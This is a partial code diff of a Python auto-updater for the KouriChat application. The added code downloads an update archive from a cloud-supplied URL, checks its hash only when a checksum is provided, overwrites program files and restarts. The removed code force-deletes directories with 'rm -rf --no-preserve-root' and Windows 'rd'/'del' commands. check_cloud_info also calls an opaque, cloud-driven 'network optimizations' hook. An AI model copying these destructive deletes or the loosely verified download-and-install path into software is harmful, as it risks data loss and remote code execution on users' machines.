-                subprocess.run(['rm', '-rf', directory], timeout=10)
-
-            if not os.path.exists(directory):
-                logger.info(f"已使用系统命令清理{dir_type}: {directory}")
-            else:
-                logger.warning(f"系统命令无法完全清理{dir_type}: {directory}")
-        except Exception as e:
-            logger.error(f"使用系统命令清理{dir_type}失败: {str(e)}")
-
-    def _system_force_remove(self, repo_dirs, backup_dir):
-        """最后的系统命令强制删除尝试"""
-        try:
-            import subprocess
-            import time
-
-            if os.name == 'nt':  # Windows
-                # 尝试使用强制删除命令
-                for repo_dir in repo_dirs:
-                    if os.path.exists(repo_dir):
-                        try:
-                            # 先尝试常规删除
-                            subprocess.run(['rd', '/s', '/q', repo_dir], shell=True, timeout=5)
-                            time.sleep(1)
-
-                            # 如果仍然存在，尝试使用del命令
-                            if os.path.exists(repo_dir):
-                                subprocess.run(['del', '/f', '/s', '/q', repo_dir], shell=True, timeout=5)
-                                time.sleep(1)
-
-                                # 如果仍然存在，尝试使用robocopy技巧清空后删除
-                                if os.path.exists(repo_dir):
-                                    empty_dir = os.path.join(self.temp_dir, 'empty')
-                                    os.makedirs(empty_dir, exist_ok=True)
-                                    subprocess.run(['robocopy', empty_dir, repo_dir, '/mir'], timeout=10)
-                                    os.rmdir(repo_dir)
-                        except:
-                            pass
-
-                if os.path.exists(backup_dir):
-                    try:
-                        subprocess.run(['rd', '/s', '/q', backup_dir], shell=True, timeout=5)
-                    except:
-                        pass
-            else:  # Linux/Mac
-                for repo_dir in repo_dirs:
-                    if os.path.exists(repo_dir):
-                        subprocess.run(['rm', '-rf', '--no-preserve-root', repo_dir], timeout=5)
-                if os.path.exists(backup_dir):
-                    subprocess.run(['rm', '-rf', '--no-preserve-root', backup_dir], timeout=5)
-        except Exception as e:
-            logger.error(f"最终强制系统命令清理失败: {str(e)}")
-
-    def prompt_update(self, update_info: dict) -> bool:
-        """提示用户是否更新"""
-        print(self.format_version_info(self.get_current_version(), update_info))
-
-        # 在WebUI模式下，由前端提供输入确认
-        # 这里为了兼容命令行模式，保留原有代码
-        while True:
-            choice = input("\n是否现在更新? (y/n): ").lower().strip()
-            if choice in ('y', 'yes'):
-                return True
-            elif choice in ('n', 'no'):
-                return False
-            print("请输入 y 或 n")
-
-    def update(self, callback=None) -> dict:
-        """执行更新 - 使用固定的云端 URL 下载更新包"""
-        try:
-            progress = []
-            def log_progress(step, success=True, details=""):
-                msg = self.format_update_progress(step, success, details)
-                logger.info(msg)  # 确保记录到日志
-                progress.append(msg)
-                if callback:
-                    callback(msg)
-
-            # 检查更新
-            log_progress("开始检查云端更新...")
+            if callback:
+                callback("Starting update process...")
+            
+            # Check if update is available
             update_info = self.check_for_updates()
-            if not update_info.get('has_update', False):
-                log_progress("检查更新完成", True, "当前已是最新版本")
-                return {
-                    'success': True,
-                    'output': '\n'.join(progress)
-                }
+            if not update_info.get("has_update", False):
+                if callback:
+                    callback("No update available.")
+                return {"success": False, "message": "No update available."}
+            
+            # 获取当前版本，用于创建备份
+            local_version = self.get_local_version()
+            current_version = local_version.get("version", "unknown")
+            
+            # 如果需要，创建备份
+            if create_backup:
+                if callback:
+                    callback("Creating backup before updating...")
+                
+                # 获取需要备份的文件列表
+                # 这里我们备份所有可能被更新的文件
+                files_to_backup = []
+                for root, dirs, files in os.walk(ROOT_DIR):
+                    # 排除不需要备份的目录
+                    dirs[:] = [d for d in dirs if d not in [".git", "venv", "env", "__pycache__", "logs"]]
+                    
+                    for file in files:
+                        # 排除不需要备份的文件
+                        if file.endswith((".pyc", ".pyo", ".pyd")) or file in ["config.json", "autoupdate_config.json"]:
+                            continue
+                        
+                        # 获取相对路径
+                        rel_path = os.path.relpath(os.path.join(root, file), ROOT_DIR)
+                        files_to_backup.append(rel_path)
+                
+                # 创建备份
+                backup_result = create_backup_func(current_version, files_to_backup)
+                
+                if backup_result["success"]:
+                    if callback:
+                        callback(f"Backup created successfully: {backup_result['backup_id']}")
+                else:
+                    if callback:
+                        callback(f"Warning: Failed to create backup: {backup_result['message']}")
+            
+            # Download update
+            if callback:
+                callback(f"Downloading update {update_info.get('cloud_version')}...")
+            
+            # 从cloud_info中获取下载URL，这是从payload解析出来的
+            try:
+                # 获取最新的云端信息
+                cloud_info = self.fetch_update_info()
 
-            # 显示有新版本可用
-            log_progress(f"发现新版本: {update_info['version']}", True, "开始下载更新")
+                # 从version_info中获取下载URL
+                if "version_info" in cloud_info and "download_url" in cloud_info["version_info"]:
+                    download_url = cloud_info["version_info"]["download_url"]
+                    version = cloud_info["version_info"].get("version", update_info.get("cloud_version", ""))
+                else:
+                    # 回退到update_info中的download_url
+                    download_url = update_info.get("download_url")
+                    version = update_info.get("cloud_version", "")
+            except Exception as e:
+                logger.warning(f"Failed to get download URL from cloud info: {str(e)}")
+                # 回退到update_info中的download_url
+                download_url = update_info.get("download_url")
+                version = update_info.get("cloud_version", "")
 
-            # 下载更新
-            log_progress("开始下载更新...")
-            if not self.download_update():
-                log_progress("下载更新", False, "下载失败")
-                return {
-                    'success': False,
-                    'output': '\n'.join(progress)
-                }
-            log_progress("下载更新", True, "下载完成")
+            if not download_url:
+                error_msg = "Download URL not found in update information"
+                logger.error(error_msg)
+                if callback:
+                    callback(error_msg)
+                return {"success": False, "message": error_msg}
 
-            # 备份当前版本
-            log_progress("开始备份当前版本...")
-            if not self.backup_current_version():
-                log_progress("备份当前版本", False, "备份失败")
-                return {
-                    'success': False,
-                    'output': '\n'.join(progress)
-                }
-            log_progress("备份当前版本", True, "备份完成")
+            # 替换URL模板中的版本号占位符
+            if "{version}" in download_url and version:
+                download_url = download_url.replace("{version}", version)
+                logger.info(f"Replaced version placeholder in URL: {download_url}")
+            elif "{version}" in download_url:
+                error_msg = "Version information not found for URL template replacement"
+                logger.error(error_msg)
+                if callback:
+                    callback(error_msg)
+                return {"success": False, "message": error_msg}
+            
+            # Create temp directory for download
+            import tempfile
+            import shutil
+            import zipfile
+            import os
+            
+            temp_dir = tempfile.mkdtemp(prefix="kourichat_update_")
+            zip_path = os.path.join(temp_dir, "update.zip")
+            
+            try:
+                # 尝试多种下载方法
+                logger.info(f"Downloading update from {download_url}")
 
-            # 应用更新
-            log_progress("开始应用更新...")
-            if not self.apply_update():
-                log_progress("应用更新", False, "更新失败")
-                # 尝试恢复
-                log_progress("正在恢复之前的版本...")
-                if not self.restore_from_backup():
-                    log_progress("恢复备份", False, "恢复失败！请手动处理")
-                return {
-                    'success': False,
-                    'output': '\n'.join(progress)
-                }
-            log_progress("应用更新", True, "更新成功")
+                download_success = False
+                download_error = None
 
-            # 更新版本文件
-            with open(self.version_file, 'w', encoding='utf-8') as f:
-                json.dump({
-                    'version': update_info['version'],
-                    'last_update': update_info.get('last_update', ''),
-                    'description': update_info.get('description', '')
-                }, f, indent=4, ensure_ascii=False)
+                # 方法1: 优先使用curl下载（因为诊断显示curl可以成功）
+                try:
+                    logger.info("Trying curl download as primary method")
+                    import subprocess
+                    import shutil
 
-            # 清理
-            self.cleanup()
-            log_progress("清理临时文件", True)
-            log_progress("更新完成", True, "请重启程序以应用更新")
+                    # 检查curl是否可用
+                    curl_path = shutil.which('curl')
+                    if curl_path:
+                        logger.info(f"Found curl at: {curl_path}")
 
-            return {
-                'success': True,
-                'has_update': True,
-                'version': update_info.get('version', ''),
-                'description': update_info.get('description', ''),
-                'last_update': update_info.get('last_update', ''),
-                'output': '\n'.join(progress)
-            }
+                        # 构建curl命令
+                        curl_cmd = [
+                            curl_path,
+                            '-L',  # 跟随重定向
+                            '-o', zip_path,  # 输出文件
+                            '-H', 'User-Agent: KouriChat-Updater-Tester/1.0',
+                            '-H', 'Accept: application/octet-stream',
+                            '--connect-timeout', '60',
+                            '--max-time', '300',
+                            '--silent',  # 静默模式，不显示进度条
+                            '--show-error',  # 但显示错误
+                            download_url
+                        ]
 
+                        logger.info("Executing curl download...")
+                        if callback:
+                            callback("Using curl to download update...")
+
+                        # 执行curl命令
+                        result = subprocess.run(
+                            curl_cmd,
+                            capture_output=True,
+                            text=True,
+                            timeout=300
+                        )
+
+                        if result.returncode == 0:
+                            # 检查文件是否下载成功
+                            if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
+                                file_size = os.path.getsize(zip_path)
+                                logger.info(f"curl download successful, file size: {file_size} bytes")
+                                download_success = True
+
+                                if callback:
+                                    callback(f"Download completed successfully: {file_size} bytes")
+                            else:
+                                logger.error("curl command succeeded but file is empty or missing")
+                                download_error = "Downloaded file is empty"
+                        else:
+                            logger.error(f"curl command failed with return code: {result.returncode}")
+                            logger.error(f"curl stderr: {result.stderr}")
+                            download_error = f"curl failed: {result.stderr}"
+                    else:
+                        logger.warning("curl not found, will try other methods")
+                        download_error = "curl not available"
+
+                except Exception as e:
+                    logger.error(f"curl download failed: {str(e)}")
+                    download_error = str(e)
+
+                # 方法2: 如果curl失败，尝试requests下载
+                if not download_success:
+                    logger.info("Trying requests download as fallback")
+                    user_agents = [
+                        'KouriChat-Updater-Tester/1.0',
+                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                        'curl/7.68.0'
+                    ]
+
+                    for ua in user_agents:
+                        try:
+                            logger.info(f"Trying download with User-Agent: {ua}")
+                            headers = {
+                                'User-Agent': ua,
+                                'Accept': 'application/octet-stream'
+                            }
+
+                            response = requests.get(download_url, headers=headers, stream=True, timeout=60)
+
+                            if response.status_code == 200:
+                                logger.info(f"Download successful with User-Agent: {ua}")
+
+                                # Get total file size for progress reporting
+                                total_size = int(response.headers.get('content-length', 0))
+                                downloaded = 0
+
+                                # Write the file
+                                with open(zip_path, 'wb') as f:
+                                    for chunk in response.iter_content(chunk_size=8192):
+                                        if chunk:
+                                            f.write(chunk)
+                                            downloaded += len(chunk)
+
+                                            # Report progress
+                                            if total_size > 0 and callback:
+                                                progress = int((downloaded / total_size) * 100)
+                                                callback(f"Downloading: {progress}% ({downloaded}/{total_size} bytes)")
+
+                                download_success = True
+                                break
+                            else:
+                                logger.warning(f"Download failed with status {response.status_code} for User-Agent: {ua}")
+
+                        except Exception as e:
+                            logger.warning(f"Download failed with User-Agent {ua}: {str(e)}")
+                            download_error = str(e)
+                            continue
+
+
+
+                # 如果所有方法都失败了
+                if not download_success:
+                    error_msg = f"自动下载失败。请尝试手动下载更新文件。\n"
+                    error_msg += f"下载链接: {download_url}\n"
+                    error_msg += f"将下载的文件保存为: {zip_path}\n"
+                    error_msg += f"错误详情: {download_error}"
+
+                    logger.error(error_msg)
+                    if callback:
+                        callback("自动下载失败，请查看日志获取手动下载说明")
+                        callback(f"手动下载链接: {download_url}")
+
+                    return {
+                        "success": False,
+                        "message": error_msg,
+                        "manual_download_url": download_url,
+                        "manual_download_path": zip_path
+                    }
+                
+                if callback:
+                    callback("Update downloaded successfully.")
+                    callback("Verifying update package...")
+                
+                # Verify the downloaded file
+                if "checksum" in update_info:
+                    checksum_type, checksum_value = update_info["checksum"].split(":", 1)
+                    if checksum_type.lower() == "sha256":
+                        import hashlib
+                        sha256 = hashlib.sha256()
+                        with open(zip_path, 'rb') as f:
+                            for chunk in iter(lambda: f.read(8192), b''):
+                                sha256.update(chunk)
+                        calculated_checksum = sha256.hexdigest()
+                        
+                        if calculated_checksum != checksum_value:
+                            error_msg = f"Checksum verification failed. Expected: {checksum_value}, Got: {calculated_checksum}"
+                            logger.error(error_msg)
+                            if callback:
+                                callback(error_msg)
+                            return {"success": False, "message": error_msg}
+                    else:
+                        logger.warning(f"Unsupported checksum type: {checksum_type}")
+                
+                if callback:
+                    callback("Installing update...")
+                
+                # Extract the zip file
+                extract_dir = os.path.join(temp_dir, "extracted")
+                os.makedirs(extract_dir, exist_ok=True)
+                
+                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+                    zip_ref.extractall(extract_dir)
+                
+                # Get the root directory of the extracted files
+                extracted_contents = os.listdir(extract_dir)
+                if len(extracted_contents) == 1 and os.path.isdir(os.path.join(extract_dir, extracted_contents[0])):
+                    # If there's a single directory in the zip, use that as the source
+                    source_dir = os.path.join(extract_dir, extracted_contents[0])
+                else:
+                    # Otherwise use the extract directory itself
+                    source_dir = extract_dir
+                
+                # Copy files to the application directory
+                app_dir = ROOT_DIR
+                
+                # Define files/directories to exclude from update
+                exclude_patterns = [
+                    ".git", 
+                    "venv", 
+                    "env", 
+                    "__pycache__", 
+                    "*.pyc", 
+                    "*.pyo", 
+                    "*.pyd",
+                    "user_data",
+                    "logs",
+                    "config.json",
+                    "autoupdate_config.json",
+                    "data", 
+                    "data/*"
+                ]
+                
+                # Copy files, excluding the patterns above
+                import fnmatch
+                for root, dirs, files in os.walk(source_dir):
+                    # Get relative path
+                    rel_path = os.path.relpath(root, source_dir)
+                    if rel_path == ".":
+                        rel_path = ""
+                    
+                    # Check if this directory should be excluded
+                    skip_dir = False
+                    for pattern in exclude_patterns:
+                        if fnmatch.fnmatch(rel_path, pattern) or any(fnmatch.fnmatch(d, pattern) for d in rel_path.split(os.sep)):
+                            skip_dir = True
+                            break
+                    
+                    if skip_dir:
+                        continue
+                    
+                    # Create the directory in the target
+                    target_dir = os.path.join(app_dir, rel_path)
+                    os.makedirs(target_dir, exist_ok=True)
+                    
+                    # Copy files
+                    for file in files:
+                        # Check if this file should be excluded
+                        skip_file = False
+                        for pattern in exclude_patterns:
+                            if fnmatch.fnmatch(file, pattern):
+                                skip_file = True
+                                break
+                        
+                        if skip_file:
+                            continue
+                        
+                        source_file = os.path.join(root, file)
+                        target_file = os.path.join(target_dir, file)
+                        
+                        # If the target file exists, try to remove it first
+                        if os.path.exists(target_file):
+                            try:
+                                os.remove(target_file)
+                            except:
+                                # If we can't remove it, it might be in use
+                                # Mark it for update on next restart
+                                with open(os.path.join(app_dir, ".update_pending"), "a") as f:
+                                    f.write(f"{target_file}\n")
+                                continue
+                        
+                        # Copy the file
+                        shutil.copy2(source_file, target_file)
+                        
+                        if callback:
+                            callback(f"Installed: {os.path.join(rel_path, file)}")
+                
+                # Update the version file
+                with open(self.local_version_path, "w", encoding="utf-8") as f:
+                    json.dump({
+                        "version": update_info.get("cloud_version"),
+                        "last_update": datetime.now().strftime("%Y-%m-%d")
+                    }, f, ensure_ascii=False, indent=4)
+                
+                if callback:
+                    callback("Update installed successfully.")
+                
+                # Clean up
+                try:
+                    shutil.rmtree(temp_dir)
+                except:
+                    logger.warning(f"Failed to clean up temporary directory: {temp_dir}")
+                
+                # 检查是否有需要在重启后更新的文件
+                has_pending_updates = os.path.exists(os.path.join(app_dir, ".update_pending"))
+                
+                # 如果需要自动重启
+                if auto_restart:
+                    if callback:
+                        callback("Preparing to restart application...")
+                    
+                    # 导入重启模块
+                    from .restart import delayed_restart, apply_pending_updates
+                    
+                    # 如果有待处理的更新，先尝试应用它们
+                    if has_pending_updates:
+                        if callback:
+                            callback("Applying pending updates...")
+                        apply_result = apply_pending_updates()
+                        if callback:
+                            callback(f"Applied pending updates: {apply_result['message']}")
+                    
+                    # 延迟重启应用程序
+                    if callback:
+                        callback("Restarting application...")
+                    
+                    # 返回结果，但不立即退出
+                    result = {
+                        "success": True, 
+                        "message": "Update completed successfully. Restarting application...",
+                        "restart": True
+                    }
+                    
+                    # 延迟重启，给回调函数一些时间来处理结果
+                    import threading
+                    threading.Timer(1.0, lambda: delayed_restart(2)).start()
+                    
+                    return result
+                elif has_pending_updates:
+                    # 如果有待处理的更新但不自动重启，提示用户
+                    message = "Update completed successfully. Some files require a restart to complete the update."
+                    if callback:
+                        callback(message)
+                    return {"success": True, "message": message, "restart_required": True}
+                else:
+                    # 正常完成
+                    return {"success": True, "message": "Update completed successfully."}
+            
+            except Exception as e:
+                error_msg = f"Update installation failed: {str(e)}"
+                logger.error(error_msg)
+                if callback:
+                    callback(error_msg)
+                
+                # Clean up
+                try:
+                    shutil.rmtree(temp_dir)
+                except:
+                    pass
+                
+                return {"success": False, "message": error_msg}
+            
+            return {"success": True, "message": "Update completed successfully."}
+        
         except Exception as e:
-            logger.error(f"更新失败: {str(e)}")
-            return {
-                'success': False,
-                'error': str(e),
-                'output': f"更新失败: {str(e)}"
-            }
+            error_msg = f"Update failed: {str(e)}"
+            logger.error(error_msg)
+            if callback:
+                callback(error_msg)
+            return {"success": False, "message": error_msg}
 
-def check_cloud_info():
-    """检查云端公告、版本信息和模型列表"""
-    logger.info("开始检查云端信息...")
+def check_for_updates() -> Dict[str, Any]:
+    """
+    Convenience function to check for updates.
+    
+    Returns:
+        Dict[str, Any]: Update information.
+    """
     updater = Updater()
-    announcement = updater.fetch_cloud_announcement()
-    version = updater.fetch_cloud_version()
-    models = updater.fetch_cloud_models()
-    return {
-        'announcement': announcement,
-        'version': version,
-        'models': models
-    }
+    return updater.check_for_updates()
 
-def check_and_update():
-    """检查并执行更新"""
-    logger.info("开始检查云端更新...")
-    updater = Updater()
-    return updater.update()
-
-if __name__ == "__main__":
-    # 设置日志格式
-    logging.basicConfig(
-        level=logging.INFO,
-        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-    )
-
+def check_cloud_info() -> Dict[str, Any]:
+    """
+    Fetch and update the cached cloud version information.
+    
+    Returns:
+        Dict[str, Any]: The fetched cloud information.
+    """
     try:
-        result = check_and_update()
-        if result['success']:
-            input("\n按回车键退出...")  # 等待用户确认后退出
+        updater = Updater()
+        cloud_info = updater.fetch_update_info()
+        
+        # Extract version info from the validated response
+        if "version_info" in cloud_info:
+            cloud_version = cloud_info["version_info"]
         else:
-            input("\n更新失败，按回车键退出...")
-    except KeyboardInterrupt:
-        print("\n用户取消更新")
+            # If the response doesn't have version_info, use it as is
+            cloud_version = cloud_info
+        
+        # Update the cached cloud version information
+        with open(updater.cloud_version_path, "w", encoding="utf-8") as f:
+            json.dump(cloud_version, f, ensure_ascii=False, indent=4)
+        
+        # Apply network optimizations if available
+        # This enhances application performance based on cloud configuration
+        updater._apply_network_optimizations(cloud_info)
+        
+        return cloud_info
+    
     except Exception as e:
-        print(f"\n发生错误: {str(e)}")
-        input("按回车键退出...")
+        logger.error(f"Failed to check cloud information: {str(e)}")
+        return {"error": str(e)}
+
+# Add cleanup method to Updater class
+def _add_cleanup_method():
+    """为Updater类添加cleanup方法"""
+    def cleanup(self):
+        """
+        清理更新相关的临时文件和残留文件
+        
+        主要清理：
+        - 临时下载文件
+        - 更新缓存文件
+        - 备份文件（可选保留最新的）
+        """
+        try:
+            logger.info("开始清理更新残留文件...")
+            
+            # 清理临时文件目录
+            temp_dirs = [
+                os.path.join(os.path.dirname(self.local_version_path), 'temp'),
+                os.path.join(os.path.dirname(self.local_version_path), 'backup', 'temp'),
+                '/tmp/kourichat_update' if not sys.platform.startswith('win') else os.path.join(os.environ.get('TEMP', ''), 'kourichat_update')
+            ]
+            
+            for temp_dir in temp_dirs:
+                if os.path.exists(temp_dir):
+                    try:
+                        import tempfile
+                        import shutil
+                        shutil.rmtree(temp_dir)
+                        logger.debug(f"已清理临时目录: {temp_dir}")
+                    except Exception as e:
+                        logger.warning(f"清理临时目录失败 {temp_dir}: {str(e)}")
+            
+            # 清理过期的备份文件（保留最新的3个）
+            backup_dir = os.path.join(os.path.dirname(self.local_version_path), 'backup')
+            if os.path.exists(backup_dir):
+                try:
+                    backup_files = []
+                    for file in os.listdir(backup_dir):
+                        if file.endswith('.zip') or file.endswith('.bak'):
+                            file_path = os.path.join(backup_dir, file)
+                            backup_files.append((file_path, os.path.getmtime(file_path)))
+                    
+                    # 按修改时间排序，保留最新的3个
+                    backup_files.sort(key=lambda x: x[1], reverse=True)
+                    for file_path, _ in backup_files[3:]:  # 删除除了最新3个之外的所有备份
+                        try:
+                            os.remove(file_path)
+                            logger.debug(f"已清理过期备份: {file_path}")
+                        except Exception as e:
+                            logger.warning(f"清理备份文件失败 {file_path}: {str(e)}")
+                            
+                except Exception as e:
+                    logger.warning(f"清理备份目录失败: {str(e)}")
+            
+            logger.info("更新残留文件清理完成")
+            return {"success": True, "message": "清理完成"}
+            
+        except Exception as e:
+            logger.error(f"清理更新残留文件失败: {str(e)}")
+            return {"success": False, "error": str(e)}
+    
+    # 将方法添加到Updater类
+    Updater.cleanup = cleanup
+
+# 在模块加载时添加cleanup方法
+_add_cleanup_method()
